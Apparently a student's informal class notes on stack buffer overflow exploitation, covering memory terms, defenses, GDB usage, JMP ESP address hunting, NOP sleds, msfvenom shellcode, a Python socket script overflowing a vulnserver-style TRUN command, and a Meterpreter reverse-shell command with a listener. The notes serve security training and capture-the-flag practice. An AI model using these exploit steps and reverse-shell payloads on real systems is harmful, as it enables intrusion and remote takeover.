SLIDES -------------------------------------------------------
-- Heap - memory that can be allocated and deallocated

-- Stack - a contiguous section of memory used for passing arguments

-- Registers - Storage elements as close as possible to the central processing unit (CPU)

-- Instruction Pointer (IP) - AKA Program Counter (PC) contains the address of next instruction to be executed

-- Stack Pointer (SP) - Contains the address of the next available space on the stack

-- Base Pointer (BP) - The base of the stack

-- Function - Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient

-- Shellcode - The code that is executed once an exploit successfully takes advantage of a vulnerability

BUFFER OVERFLOW DEFENSES
  -  Non executable (NX) stack

  - Address Space Layout Randomization (ASLR)

  - Data Execution Prevention (DEP)

  - Stack Canaries

  - Position Independent Executable (PIE)

TECHNICAL HELP
Utilizing tools such as:

 -- IDA, GHIDRA  - DISASSEMBLERS

 -- GDB, MONA, IMMUNITY - DEBUGGERS. MONA IS A PYTHJON PLUGIN FOR IMMUNITY

 -- BASH, PYTHON - exploits 
GDB USES
    - peda install plugin
        - git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
    - common commands
    - disass <FUNCTION>   
        -Disassemble portion of the program
    - info <...>  
        - Supply info for specific stack areas
    - x/256c $<REGISTER>  
        -   Read characters from specific register
    - break <address>  
        - Establish a break point
        
SLIDES ---------------------------------
0. CHECK IF ASLR IS ACTIVE
    - sudo cat /proc/sys/kernel/randomize_va_space
1. FIND VULNERABLE PROGRAM

- Two ways a script can take info from user, either as a parameter ( func.py penis), or input
- use pdisass <function> starting with main 
- the "gets()" function is vulnerable to buffer overflow 
- if you see segmentation fault the program is vulnerable to buffer overflwo 
2. OVERFLOW TO INSTRUCTION POINTER
- need to overflow to instruction pointer
- <<< "open to the input of" 
- maybe use python 2 
- run <<< $(python2 sgtwilson.py) 
- if it worked EIP will be whatever we set it too in our script 
- specify our OWN EIP
3. OPEN GDB AND UNSET VARIABLES
- open base gdb 
    -  env - gdb <program>
- unset variables
    - show env
    - unset env <var>
4. GRAB ENTIRE HEAP
- run program, overflow it
    - info proc map 

- use find command 
        - find /b 0xf7de2000, 0xffffe000, 0xff, 0xe4
        - the 0xff and 0xe4 will always be the same, the memory addresses are dynamic
- first heap memory address starts under the [HEAP] entry 
- last memory address is the [stack] 
- will provide all jump ids, all of them will work
- grab handful of ids
- copy paste handful of ids into a comment in your script so you dont have to do this again.
- x86 is little endian
- must be in reverse byte order 
5. REVERSE BYTE ORDER 
      - 0xf7f68ee3
         - '\xe3\x8e\xf6\xf7'
      - 0xf7f68f9b
      - 0xf7f69043
      - python recognizes bytes as \x<byte>
      - replace the EIP value with the reverse byte order of the memory addr
      - add NOP
          - nop = '\x90' * 10
          - make sure to add nop to your print statement
          
6. ACTIONS, MSFVENOM/MSFCONSOLE 
    - creating shell code
    - keep it simple or you are fucked 
    - MSFVENOM
          - -p specify payload 
          - linux/x86/exec == executes a command
          - cmd = <command> 
          - -b == bad characters '\x00'
              - any character that will cause errors, null characters will stop code. so get rid of it 
          - -f == format, use python 
    - FULL MSF VENOM COMMAND CURRENTLY == msfvenom -p linux/x86/exec cmd="whoami" -b '\x00' -f python ### REPLACE THE 'whoami' WITH WHATEVER COMMAND
    - GO CRAZY 
    - COPY PASTE SHELL CODE INTO SCRIPT AND ADD THE "buf" VARIABLE TO THE PRINT STATEMENT 
    - MSFCONSOLE 
        - use payload <payload>
        - set cmd "whoami"
        - generate payload
            - generate -b '\x00' -f python 
SCRIPT 
WINDOWS BUFFER OVERFLOW
1. PLACE PROGRAM IN IMMUNITY DEBUGGER 
    - run "!mona bytearray"
    - paste values into socket script!!
    - remove "\x00" 
    
2. create socket script!
    -   1 #!/usr/bin/python
    -   2 
    -   3 import socket
    - 4 buff = "TRUN /.:/"
    - 5 buff += "A" * 2003
    - 6 buff += "B" * 4
    - 7 buff += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16    \x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    - 8 buff += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35    \x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    - 9 buff +=" \x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55    \x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    - 10 buff += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75    \x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    -  11 buff += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95    \x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    - 12 buff += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5    \xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    - 13 buff += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5    \xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    - 14 buff += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5    \xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    - 15 
    - 16 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM )
    - 17 s.connect(('10.50.23.7',9999))
    - 18 print s.recv(1024)
    - 19 s.send(buff)
    -20 print s.recv(1024)
    -21 s.close()
    -22 
~                                                                                                    
~                             
3. Jump to EAX register value "follow in dump", verify that is functions properly
4. JMP AROUND
    - run "!mona jmp-r ESP -m "essfunc.dll" 
    - this creats a list of valie esp jump addrs
    - pull the one from the top 
SGT WILSONM
      - use multi handler 
      - msfvenom -p windows/meterpreter/shell_reverse_tcp LHOST=<LINOPS LPORT=<RHP> -f python 
      - MSFCONSOLE
      - set LHOST 0.0.0.0 < LISTENER 
      - set LPORT same as MSFVENOM 
      - 
CTFD 
    --
    0xf7def000 - BOTTOM OF HEAP 
    0xffffe000 - TOP OF HEAP 
    -
  
